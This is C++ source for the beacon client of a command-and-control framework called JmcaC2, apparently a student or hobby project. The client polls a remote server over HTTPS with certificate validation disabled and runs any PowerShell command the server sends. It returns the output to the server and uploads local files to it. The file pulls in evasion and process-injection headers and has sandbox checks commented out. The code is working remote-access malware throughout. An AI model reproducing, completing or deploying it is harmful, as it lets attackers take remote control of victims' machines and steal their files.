// Authors: Hudson and Isaac
// Date: 11/17/2025
// Description: Beacon client for JmcaC2
// Compile: g++ .\main.cpp -lwinhttp -lws2_32 -o beacon-client.exe
// Compile: cl  main.cpp /link ws2_32.lib winhttp.lib user32.lib;

#include "evasion.h"
#include "procInjection.h"
#include "common.h"

using std::string;
namespace fs = std::filesystem;

const wchar_t* ACCEPTED_MIME_TYPES[] = {
    L"text/plain", L"application/octet-stream", L"text/html",
    L"multipart/form-data", NULL};

int CreateTCPConn();
bool sendHTTPTaskResult();
string runPSCommand(string command);
bool sendRequestedFile(const std::string& filePath);
bool sendTaskResults(const std::string& data);

static std::wstring beaconName = L"";

bool runTask(string outBuffer, DWORD dwSize) {
    printf("Running TASK: %.*s\n", dwSize, outBuffer.c_str());

    size_t pipePos = outBuffer.find('|');

    if (pipePos == string::npos) return false;

    string cmd = outBuffer.substr(0, pipePos);

    if (cmd == "powershell") runPSCommand(outBuffer.substr(pipePos + 1));

    return true;
}

bool fetchWinHTTPError(const char* msg) {
    std::cout << msg << " failed: " << GetLastError() << "\n";
    return false;
}

bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
    // WinHTTP > WinINet

    /*WinHttpOpen -> WinHttpConnect (example.com) -> WinHttpOpenRequest   ->
    WinHttpSetOption (user-agent/content-type) ->
    WinHttpSendRequest -> WinHttpReadData -> TASK -> Close / cleanup*/

    // https://github.com/MicrosoftDocs/win32/blob/docs/desktop-src/WinHttp/winhttp-sessions-overview.md#using-the-winhttp-api-to-access-the-web

    HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
    bool isRequestSuccessful{}, didReceiveResponse{};

    if (!(hHTTPSession = WinHttpOpen(
              L"JmcaC2 Task Fetching", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
        return fetchWinHTTPError("WinHttpOpen");

    if (!(hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
                                           (INTERNET_PORT)HTTP_SERVER_PORT, 0)))
        return fetchWinHTTPError("WinHttpOpen");

    if (!(hHTTPRequest = WinHttpOpenRequest(
              hHTTPConnection, L"GET", RESOURCE_NAME, NULL, WINHTTP_NO_REFERER,
              ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE)))
        return fetchWinHTTPError("WinHttpOpenRequest");

    std::cout << "Request Sent" << std::endl;

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

    if (!WinHttpSetOption(hHTTPRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags,
                          sizeof(flags)))
        return fetchWinHTTPError("WinHttpSetOption");

    std::wstring headerString;
    LPCWSTR headerPtr = WINHTTP_NO_ADDITIONAL_HEADERS;

    if (!beaconName.empty()) {
        headerString = L"BeaconName: " + beaconName + L"\r\n";
        headerPtr = headerString.c_str();
    }

    // should be replaced if POST
    if (!(isRequestSuccessful =
              WinHttpSendRequest(hHTTPRequest, headerPtr, (DWORD)-1,
                                 WINHTTP_NO_REQUEST_DATA, 0, 0, 0)))
        return fetchWinHTTPError("WinHttpSendRequest");

    if (!(didReceiveResponse = WinHttpReceiveResponse(hHTTPRequest, NULL)))
        return fetchWinHTTPError("WinHttpReceiveResponse");

    // extract the beacon name from the response
    if (beaconName.empty()) {
        DWORD size = 0;
        WinHttpQueryHeaders(hHTTPRequest, WINHTTP_QUERY_CUSTOM, L"BeaconName",
                            WINHTTP_NO_OUTPUT_BUFFER, &size,
                            WINHTTP_NO_HEADER_INDEX);

        // If size is 0, the header isn't present.
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            std::wstring buffer(size / sizeof(wchar_t),
                                L'\0');  // allocate correct size

            if (WinHttpQueryHeaders(hHTTPRequest, WINHTTP_QUERY_CUSTOM,
                                    L"BeaconName", &buffer[0], &size,
                                    WINHTTP_NO_HEADER_INDEX)) {
                buffer.resize(
                    (size / sizeof(wchar_t)));  // remove terminating null
                wprintf(L"Header value: %s\n", buffer.c_str());
                beaconName = buffer;
            }
        }
    }

    DWORD dwSize = 0;

    while (true) {
        if (!WinHttpQueryDataAvailable(hHTTPRequest, &dwSize) || !dwSize) break;
        char* responseBuf = new char[dwSize + 1];
        ZeroMemory(responseBuf, dwSize + 1);

        DWORD dwOut = 0;

        if (!WinHttpReadData(hHTTPRequest, responseBuf, dwSize, &dwOut)) {
            delete[] responseBuf;
            break;
        }

        // append chunk to output
        char* newBuf = new char[*dwSizeOut + dwOut];

        if (*outBuffer != nullptr) {
            memcpy(newBuf, *outBuffer, *dwSizeOut);
            delete[] (*outBuffer);
        }

        memcpy(newBuf + *dwSizeOut, responseBuf, dwOut);

        *outBuffer = newBuf;
        *dwSizeOut += dwOut;
        delete[] responseBuf;
    }

    if (hHTTPRequest) WinHttpCloseHandle(hHTTPRequest);
    if (hHTTPConnection) WinHttpCloseHandle(hHTTPConnection);
    if (hHTTPSession) WinHttpCloseHandle(hHTTPSession);

    return didReceiveResponse;
}

bool sendRequestedFile(const std::string& filePath) {
    HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
    bool isRequestSuccessful{}, didReceiveResponse{};

    if (!(hHTTPSession = WinHttpOpen(
              L"JmcaC2 Task Results", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
        return fetchWinHTTPError("WinHttpOpen");

    if (!(hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
                                           (INTERNET_PORT)HTTP_SERVER_PORT, 0)))
        return fetchWinHTTPError("WinHttpOpen");

    if (!(hHTTPRequest = WinHttpOpenRequest(
              hHTTPConnection, L"POST", L"/upload", NULL, WINHTTP_NO_REFERER,
              ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE)))
        return fetchWinHTTPError("WinHttpOpenRequest");

    std::cout << "Request Sent" << std::endl;

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

    if (!WinHttpSetOption(hHTTPRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags,
                          sizeof(flags)))
        return fetchWinHTTPError("WinHttpSetOption");

    std::uintmax_t fileSize = std::filesystem::file_size(filePath);
    char* buf = new char[fileSize];

    fs::path fileName = fs::path(filePath).filename();

    std::ifstream fin(filePath, std::ios::binary);
    fin.read(buf, fileSize);

    if (!fin)
        std::cerr << "Error reading file, could only read " << fin.gcount()
                  << " bytes" << std::endl;
    fin.close();

    std::string boundary = "---------------------------7e13971310878";

    std::string startBoundary =
        "--" + boundary +
        "\r\n"
        "Content-Disposition: form-data; name=\"fileUpload\"; filename=\"" +
        fileName.string() +
        "\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n";

    std::string endBoundary = "\r\n--" + boundary + "--\r\n";

    DWORD contentLength =
        (DWORD)(startBoundary.size() + fileSize + endBoundary.size());

    std::wstring headers = L"BeaconName: " + beaconName + L"\r\n";
    headers += L"Content-Type: multipart/form-data; boundary=" +
               std::wstring(boundary.begin(), boundary.end()) + L"\r\n" +
               L"Content-Length: " + std::to_wstring(contentLength) + L"\r\n";

    // Send Request
    if (!(isRequestSuccessful = WinHttpSendRequest(
              hHTTPRequest, headers.c_str(), (DWORD)-1, WINHTTP_NO_REQUEST_DATA,
              (DWORD)0, contentLength, 0)))

        return fetchWinHTTPError("WinHttpSendRequest");

    DWORD bytesWritten = 0;

    WinHttpWriteData(hHTTPRequest, startBoundary.data(),
                     (DWORD)startBoundary.size(), &bytesWritten);
    WinHttpWriteData(hHTTPRequest, buf, fileSize, &bytesWritten);
    WinHttpWriteData(hHTTPRequest, endBoundary.data(),
                     (DWORD)endBoundary.size(), &bytesWritten);

    if (!(didReceiveResponse = WinHttpReceiveResponse(hHTTPRequest, NULL)))
        return fetchWinHTTPError("WinHttpReceiveResponse");

    DWORD dwSize = 0;

    if (hHTTPRequest) WinHttpCloseHandle(hHTTPRequest);
    if (hHTTPConnection) WinHttpCloseHandle(hHTTPConnection);
    if (hHTTPSession) WinHttpCloseHandle(hHTTPSession);

    return didReceiveResponse;
}
bool sendTaskResults(const std::string& data) {
    HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
    bool isRequestSuccessful{}, didReceiveResponse{};

    if (!(hHTTPSession = WinHttpOpen(
              L"JmcaC2 Task Results", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
        return fetchWinHTTPError("WinHttpOpen");

    if (!(hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
                                           (INTERNET_PORT)HTTP_SERVER_PORT, 0)))
        return fetchWinHTTPError("WinHttpOpen");

    if (!(hHTTPRequest = WinHttpOpenRequest(
              hHTTPConnection, L"POST", RESOURCE_NAME, NULL, WINHTTP_NO_REFERER,
              ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE)))
        return fetchWinHTTPError("WinHttpOpenRequest");

    std::cout << "Request Sent" << std::endl;

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

    if (!WinHttpSetOption(hHTTPRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags,
                          sizeof(flags)))
        return fetchWinHTTPError("WinHttpSetOption");

    std::wstring headers = L"Content-Type: multipart/form-data\r\n";

    headers += L"BeaconName: " + beaconName + L"\r\n";

    // should be replaced if POST
    if (!(isRequestSuccessful = WinHttpSendRequest(
              hHTTPRequest, headers.c_str(), (DWORD)-1, (LPVOID)data.data(),
              (DWORD)data.size(), (DWORD)data.size(), 0)))
        return fetchWinHTTPError("WinHttpSendRequest");

    if (!(didReceiveResponse = WinHttpReceiveResponse(hHTTPRequest, NULL)))
        return fetchWinHTTPError("WinHttpReceiveResponse");

    DWORD dwSize = 0;

    if (hHTTPRequest) WinHttpCloseHandle(hHTTPRequest);
    if (hHTTPConnection) WinHttpCloseHandle(hHTTPConnection);
    if (hHTTPSession) WinHttpCloseHandle(hHTTPSession);

    return didReceiveResponse;
}

string runPSCommand(string command) {
    char psBuffer[DEFAULT_PS_BUFLEN];
    string res;

    string powershellCommand =
        "powershell -NoProfile -NonInteractive -Command \"" + command + "\"";

    FILE* pPipe = _popen(powershellCommand.c_str(), "rt");

    if (!pPipe) return "ERROR";

    while (fgets(psBuffer, DEFAULT_PS_BUFLEN, pPipe)) {
        res += psBuffer;
        puts(psBuffer);  // THIS IS THE ONLY WAY TO GET STDOUT FIXME: NOT EVEN
                         // WHEN I COUT << RESULT
    }

    int exitCode = _pclose(pPipe);

    sendTaskResults(res);

    return res;

    // TODO: Make this process injection?
}

int main(int argc, const char** argv) {
    // Run all checks
    // BOOL cpuOK = checkCPU();
    // BOOL ramOK = checkRAM();
    // BOOL hddOK = checkHDD();
    // BOOL processesOK = checkProcesses();

    // Check if all tests passed
    // if (!cpuOK || !ramOK || !hddOK || !processesOK) {
    //     return 0;
    // }

    std::string testFilename = ".\\file.txt";
    std::cout << "Uploading: " << testFilename << std::endl;

    sendRequestedFile(testFilename);
    char* outBuffer = nullptr;
    DWORD dwSize = 0;

    while (true) {
        if (fetchTasks(&outBuffer, &dwSize)) {
            // TODO: parse tasks and do
            if (dwSize > 0) {
                runTask(outBuffer, dwSize);
                // printf("TASK: %.*s\n", dwSize, outBuffer);
                delete[] outBuffer;
                dwSize = 0;
            }
            // processInject();
            // runPSCommand(argv[1]);
            //  TODO: post results
        }

        // TODO: jitter sleep interval
        Sleep(10000);
    }

    return 0;
}